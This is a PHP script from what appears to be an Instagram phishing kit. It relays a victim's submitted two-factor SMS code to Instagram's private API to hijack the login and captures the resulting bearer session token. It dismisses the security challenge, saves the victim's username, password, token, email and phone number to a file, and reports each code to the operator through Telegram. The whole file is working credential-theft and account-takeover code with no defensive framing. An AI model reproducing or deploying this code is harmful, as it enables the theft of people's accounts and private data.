<?php
session_start();
error_reporting(0);

require '../request.php';
require '../telegram.php';
require  '../headers.php';
require '../encrypt.php';
require_once '../account.php';

use App\Headers\HeadersList;
use App\Request\Requests;
use App\Telegrams\telegram;
use App\Encrypt\encrypts;
use App\Account\account;

class twofactor
{

    private $Requests;
    private $telegram;
    private $headersList;
    private $enc;

    public function __construct()
    {
        $this->Requests = new Requests();
        $this->telegram = new telegram();
        $this->headersList = new HeadersList();
        $this->enc = new encrypts();
    }

    public function logfile($username)
    {
        return  '../../log/' . $username . 'login_log.txt';
    }

    public function log($message, $endpoint, $username)
    {
        $logMessage = $endpoint . " - " . $message . PHP_EOL;
        file_put_contents($this->logFile($username), $logMessage, FILE_APPEND);
    }

    public function currentedituser($bearer, $user_id)
    {

        $headers = $this->headersList->appheaders($bearer, $user_id);

        $response = $this->Requests->RequestGETendpoint('accounts/current_user/?edit=true', $headers);

        $data = json_decode($response, true);

        return $data['user']['fbid_v2'];
    }

    public function logged_in_user($bearer, $user_id, $username, $password, $fbid)
    {

        $headers = $this->headersList->appheaders($bearer, $user_id);

        $post = [
            "_uid" => $user_id,
            "device_id" => $this->headersList->X_Ig_Android_Id,
            "_uuid" => $this->headersList->X_Ig_Device_Id,
        ];

        $response = $this->Requests->RequestPostendpoint("accounts/account_security_info/", $headers, $post);

        $data = json_decode($response['body'], true);

        $email = !empty($data['email']) ? $data['email'] : "Yok";
        $phone_number = !empty($data['phone_number']) ? $data['phone_number'] : "Yok";

        $userdata = [
            'username'   => $username,
            'password'   => $password,
            'token'      => $bearer,
            'id'         => $user_id,
            'email'      => $email,
            'phone'      => $phone_number,
            'fbid'       => $fbid,
        ];

        $jsondata = json_encode($userdata, JSON_PRETTY_PRINT);

        $filename = '../../cookies' . '/' . $username . '.json';
        file_put_contents($filename, $jsondata);
    }


    public function twofactorLOGİN($username, $two_factor_identifier, $code, $verification_method)
    {
        $headers = $this->headersList->localheaders();

        $post = [
            "verification_code" => htmlspecialchars($code, ENT_QUOTES, 'UTF-8'),
            "phone_id" => $this->headersList->X_Ig_Family_Device_Id,
            "two_factor_identifier" => htmlspecialchars($two_factor_identifier, ENT_QUOTES, 'UTF-8'),
            "username" => htmlspecialchars($username, ENT_QUOTES, 'UTF-8'),
            "trust_this_device" => "1",
            "guid" => $this->headersList->X_Ig_Device_Id,
            "device_id" => $this->headersList->X_Ig_Android_Id,
            "waterfall_id" => $this->enc->generateUUID(),
            "verification_method" => $verification_method,
            // 3 duo 2 yedek kodlar  1 sms Coded By Mythic
        ];


        $response = $this->Requests->RequestPostendpoint("accounts/two_factor_login/", $headers, $post);

        $this->log('Sms  Faktor Login', $response['body'], $username);

        $messages = json_decode($response['body'], true);

        if ($messages['status'] === 'fail') {
            $eren = $messages['message'];
        } else {
            $eren = false;
        }

        return [
            'headers' => $response['headers'],
            'body' => $response['body'],
            'message' => $eren
        ];
    }


    public function challengefactor($bearer, $user_id)
    {
        $headers = $this->headersList->appheaders($bearer, $user_id);

        $x_device_id = $this->headersList->X_Ig_Device_Id;
        $x_ig_android_id = $this->headersList->X_Ig_Android_Id;

        $response = $this->Requests->RequestGETendpoint("challenge/?guid=$x_device_id&device_id=$x_ig_android_id", $headers);


        $data = json_decode($response, true);
        $cni = $data['cni'];
        $context = $data['challenge_context'];


        $data = [
            "cni" => $cni,
            "_uuid" => $this->headersList->X_Ig_Device_Id,
            "bk_client_context" => '{"bloks_version":"' . $this->headersList->X_Bloks_Version_Id . '","styles_id":"instagram"}',
            "fb_family_device_id" => $this->headersList->X_Ig_Family_Device_Id,
            "challenge_context" => $context,
            "bloks_versioning_id" => $this->headersList->X_Bloks_Version_Id,
            "get_challenge" => "true",

        ];

        $response1 = $this->Requests->RequestPostendpoint("bloks/apps/com.instagram.challenge.navigation.take_challenge/", $headers, $data);

        $data = [
            "choice" => "0",
            "_uuid" => $this->headersList->X_Ig_Device_Id,
            "has_follow_up_screens" => "0",
            "bk_client_context" => '{"bloks_version":"' . $this->headersList->X_Bloks_Version_Id . '","styles_id":"instagram"}',
            "bloks_versioning_id" => $this->headersList->X_Bloks_Version_Id,
        ];

        $response2 = $this->Requests->RequestPostendpoint("bloks/apps/com.instagram.challenge.navigation.take_challenge/", $headers, $data);

        return [
            'response' => $response,
            'response1' => $response1,
            'response2' => $response2,
        ];
    }
}

$twofactor_login = new twofactor;
$telegram = new telegram;
$account = new account;


if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $code = htmlspecialchars($_POST["code"], ENT_QUOTES, 'UTF-8');
    $username = htmlspecialchars($_POST['username'], ENT_QUOTES, 'UTF-8');
    $password = htmlspecialchars($_SESSION['password'], ENT_QUOTES, 'UTF-8');
    $identify = htmlspecialchars($_SESSION['two_factor_identifier']);
    $verification_method = "1";

    $responsefactor = $twofactor_login->twofactorLOGİN($username, $identify, $code, $verification_method);

    $message = $responsefactor['message'];

    $data = json_decode($responsefactor['body'], true);

    if ($data['status'] === 'ok') {
        $headers = $responsefactor['headers'];
        $fbid_v2 = $data['logged_in_user']['fbid_v2'];
        $headers = explode("\r\n", $headers);
        foreach ($headers as $header) {
            if (strpos($header, 'ig-set-authorization') !== false) {
                $bearer = trim(explode(':', $header, 2)[1]);
                preg_match('|Bearer IGT:(.*):(.*)|isu', $bearer, $session_json);
                $session_json = json_decode(base64_decode($session_json[2]));
                $user_id = $session_json->ds_user_id;

                $twofactor_login->challengefactor($bearer, $user_id);
                $twofactor_login->logged_in_user($bearer, $user_id, $username, $password, $fbid_v2);


                $domain = filter_input(INPUT_SERVER, 'HTTP_HOST', FILTER_SANITIZE_URL);
                $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";

                $directory = dirname(__FILE__);
                $parentDirectory = dirname($directory);
                $grandParentDirectory = dirname($parentDirectory);
                $grandParentDirectorys = dirname($grandParentDirectory);
                $grandParentDirectoryName = basename($grandParentDirectorys);

                $url = $protocol . $domain . "/" . $grandParentDirectoryName . "/form/app/s2s.php?username=" . urlencode($username);

                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_TIMEOUT, 4);
                curl_exec($ch);
                curl_close($ch);

                $telegram->truecodecek($username, $code);
                $telegram->truecodecek($username, $code, true);
                echo trim('loginsucces');
            }
        }
    } else {
        $telegram->badcode($username, $code, false, $message);
        $telegram->badcode($username, $code, true, $message);
        echo trim('badcode');
    }
}
